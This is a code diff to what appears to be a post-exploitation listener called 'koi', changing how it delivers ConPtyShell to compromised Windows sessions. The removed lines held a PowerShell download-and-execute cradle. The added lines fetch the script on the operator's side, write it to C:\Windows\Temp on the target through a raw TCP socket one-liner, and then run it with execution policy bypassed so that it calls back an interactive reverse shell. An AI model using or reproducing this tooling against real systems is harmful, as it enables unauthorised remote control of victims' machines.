@@ -9,6 +9,9 @@ import socket
 import sys
 import threading
 import time
+import urllib.request
+
+from koi.utils.tcp import spawn_send_server
 from typing import Dict, Optional
 
 from koi.cli import print_help
@@ -342,20 +345,57 @@ class Listener:
         if local_ip in ("0.0.0.0", ""):
             local_ip = "127.0.0.1"
 
-        ps_cmd = (
-            f"iex(New-Object Net.WebClient).DownloadString('{self._CONPTYSHELL_URL}');"
-            f"Invoke-ConPtyShell -RemoteIp {local_ip} -RemotePort {self.port}"
-            f" -Rows {rows} -Cols {cols} -CommandLine powershell"
+        # Download ConPtyShell locally, then push it to the target via TCP.
+        with Spinner("Fetching ConPtyShell locally…"):
+            try:
+                with urllib.request.urlopen(self._CONPTYSHELL_URL, timeout=15) as resp:
+                    ps1_data = resp.read()
+            except Exception as exc:
+                notify('error', f"Failed to fetch ConPtyShell: {exc}")
+                return
+
+        # Step 2: upload the PS1 to the target via TCP.
+        # The upload command is sent DIRECTLY to the PS session (no outer
+        # `powershell -c "..."` wrapper) so that PowerShell does not expand
+        # $_c/$_f/$_b/$_n to empty strings before the subprocess sees them.
+        remote_path = r"C:\Windows\Temp\Invoke-ConPtyShell.ps1"
+        upload_port, upload_thread, upload_errors = spawn_send_server(ps1_data, timeout=15)
+
+        upload_cmd = (
+            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{upload_port});"
+            f"$_s=$_c.GetStream();"
+            f"$_f=[IO.File]::OpenWrite('{remote_path}');"
+            f"$_b=New-Object byte[] 65536;"
+            f"while(($_n=$_s.Read($_b,0,$_b.Length))-gt 0){{$_f.Write($_b,0,$_n)}};"
+            f"$_f.Close();$_c.Close()"
         )
-        cmd = f"powershell -nop -ep bypass -c \"{ps_cmd}\"\r\n"
+
+        with Spinner(f"Uploading ConPtyShell ({len(ps1_data)} bytes)…"):
+            sess.send((upload_cmd + "\r\n").encode(sess.encoding, errors="replace"))
+            upload_thread.join(timeout=15)
+
+        if upload_errors:
+            notify('error', f"ConPtyShell upload failed: {upload_errors[0]}")
+            return
+
+        notify('info', f"ConPtyShell uploaded → {remote_path}")
+        time.sleep(1.0)  # let remote PS finish writing before we invoke
+
+        # Step 3: dot-source and invoke. No $-variables in this string,
+        # so no expansion issue when PS evaluates the outer quotes.
+        invoke_cmd = (
+            f"powershell -nop -ep bypass -c \". '{remote_path}';"
+            f"Invoke-ConPtyShell -RemoteIp {local_ip} -RemotePort {self.port}"
+            f" -Rows {rows} -Cols {cols} -CommandLine powershell\""
+        )
 
         notify('info',
-            f"Sending ConPtyShell to session {_p(f'#{sess.id}')} → callback {_b(local_ip)}:{_b(self.port)}"
+            f"Invoking ConPtyShell on session {_p(f'#{sess.id}')} → callback {_b(local_ip)}:{_b(self.port)}"
         )
 
         self._pending_conpty[sess.addr[0]] = sess.os_type
         known_ids = set(self._sessions.keys())
-        sess.send(cmd.encode(sess.encoding, errors="replace"))
+        sess.send((invoke_cmd + "\r\n").encode(sess.encoding, errors="replace"))
 
         with Spinner("Waiting for ConPtyShell connection…"):
             new_sess = self._wait_for_new_session(
